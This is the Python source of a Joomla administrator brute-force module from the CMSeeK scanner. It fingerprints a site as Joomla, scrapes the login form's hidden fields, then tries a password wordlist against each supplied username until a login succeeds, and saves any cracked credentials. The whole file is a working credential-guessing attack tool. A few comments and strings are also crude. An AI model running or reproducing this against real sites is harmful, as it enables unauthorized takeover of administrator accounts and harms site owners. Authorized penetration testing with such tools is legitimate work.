#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This is a part of CMSeeK, check the LICENSE file for more information
# Copyright (c) 2018 - 2020 Tuhinshubhra
### Joomla Bruteforce module
### Version 1.3
### This thing took a whole freaking night to build... apperently i was dealing with the cookies in a not so "Wise" manner!
### cmseekbruteforcemodule <- make sure you include this comment in any custom modules you create so that cmseek can recognize it as a part of it's module

import cmseekdb.basic as cmseek
import cmseekdb.sc as source # Contains function to detect cms from source code
import cmseekdb.header as header # Contains function to detect CMS from gathered http headers
import cmseekdb.generator as generator
import multiprocessing ## Let's speed things up a lil bit (actually a hell lot faster) shell we?
from functools import partial ## needed somewhere :/
import sys
import cmseekdb.generator as generator
import re
import urllib.request, urllib.error, urllib.parse
import http.cookiejar
from html.parser import HTMLParser

class extInpTags(HTMLParser):

    def __init__(self):
        HTMLParser.__init__(self)
        self.return_array = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            name  = None
            value = None
            for nm,val in attrs:
                if nm == "name":
                    name = val
                if nm == "value":
                    value = val
            if name is not None and value is not None:
                self.return_array.update({name:value})


def testlogin(url,user,passw):
    url = url + '/administrator/index.php'
    cj = http.cookiejar.FileCookieJar("cookieszz")
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    joomloginsrc = opener.open(url).read().decode()
    parser = extInpTags()
    post_array = parser.feed(joomloginsrc)
    main_param = {'username':user, 'passwd':passw}
    other_param = parser.return_array
    post_data = main_param.copy()
    post_data.update(other_param)
    post_datad = urllib.parse.urlencode(post_data).encode("utf-8")
    ua = cmseek.randomua('generatenewuaeverytimetobesafeiguess')
    try:
        with opener.open(url, post_datad) as response:
            scode = response.read().decode()
            headers = str(response.info())
            rurl = response.geturl()
            r = ['1', scode, headers, rurl] ## 'success code', 'source code', 'http headers', 'redirect url'
            return r
    except Exception as e:
        e = str(e)
        r = ['2', e, '', ''] ## 'error code', 'error message', 'empty'
        return r
    print('hola')


def start():
    cmseek.clearscreen()
    cmseek.banner("Joomla Bruteforce Module")
    url = cmseek.targetinp("") # input('Enter Url: ')
    cmseek.info("Checking for Joomla")
    bsrc = cmseek.getsource(url, cmseek.randomua('foodislove'))
    joomcnf = '0'
    if bsrc[0] != '1':
        cmseek.error("Could not get target source, CMSeek is quitting")
        cmseek.handle_quit()
    else:
        ## Parse generator meta tag
        parse_generator = generator.parse(bsrc[1])
        ga = parse_generator[0]
        ga_content = parse_generator[1]

        try1 = generator.scan(ga_content)
        if try1[0] == '1' and try1[1] == 'joom':
            joomcnf = '1'
        else:
            try2 = source.check(bsrc[1], url)
            if try2[0] == '1' and try2[1] == 'joom':
                joomcnf = '1'
            else:
                try3 = header.check(bsrc[2]) # Headers Check!
                if try3[0] == '1' and try3[1] == 'joom':
                    joomcnf = '1'
                else:
                    joomcnf = '0'
    if joomcnf != '1':
        cmseek.error('Could not confirm Joomla... CMSeek is quitting')
        cmseek.handle_quit()
    else:
        cmseek.success("Joomla Confirmed... Confirming form and getting token...")
        joomloginsrc = cmseek.getsource(url + '/administrator/index.php', cmseek.randomua('thatsprettygay'))
        if joomloginsrc[0] == '1' and '<form' in joomloginsrc[1]:
            # joomtoken = re.findall(r'type=\"hidden\" name=\"(.*?)\" value=\"1\"', joomloginsrc[1])
            # if len(joomtoken) == 0:
            #    cmseek.error('Unable to get token... CMSeek is quitting!')
            #    cmseek.handle_quit()
            # cmseek.success("Token grabbed successfully: " + cmseek.bold + joomtoken[0] + cmseek.cln)
            # token = joomtoken[0]
            joomparamuser = []
            rawuser = input("[~] Enter Usernames with coma as separation without any space (example: cris,harry): ").split(',')
            for rusr in rawuser:
                joomparamuser.append(rusr)
            joombruteusers = set(joomparamuser) ## Strip duplicate usernames in case any smartass didn't read the full thing and entered admin as well
            for user in joombruteusers:
                passfound = '0'
                print('\n')
                cmseek.info("Bruteforcing User: " + cmseek.bold + user + cmseek.cln)
                pwd_file = open("wordlist/passwords.txt", "r")
                passwords = pwd_file.read().split('\n')
                passwords.insert(0, user)
                for password in passwords:
                    if password != '' and password != '\n':
                        sys.stdout.write('[*] Testing Password: ')
                        sys.stdout.write('%s\r\r' % password)
                        sys.stdout.flush()
                        # print("Testing Pass: " + password)
                        cursrc = testlogin(url, user, password)
                        # print('Token: ' + token)
                        # print("Ret URL: " + str(cursrc[3]))
                        if 'logout' in str(cursrc[1]):
                            print('\n')
                            cmseek.success('Password found!')
                            print(" |\n |--[username]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[password]--> " + cmseek.bold + password + cmseek.cln + "\n |")
                            cmseek.success('Enjoy The Hunt!')
                            cmseek.savebrute(url,url + '/administrator/index.php',user,password)
                            passfound = '1'
                            break
                        else:
                            continue
                        break
                if passfound == '0':
                        cmseek.error('\n\nCould Not find Password!')
                print('\n\n')

        else:
            cmseek.error("Couldn't find login form... CMSeeK is quitting")
            cmseek.handle_quit()
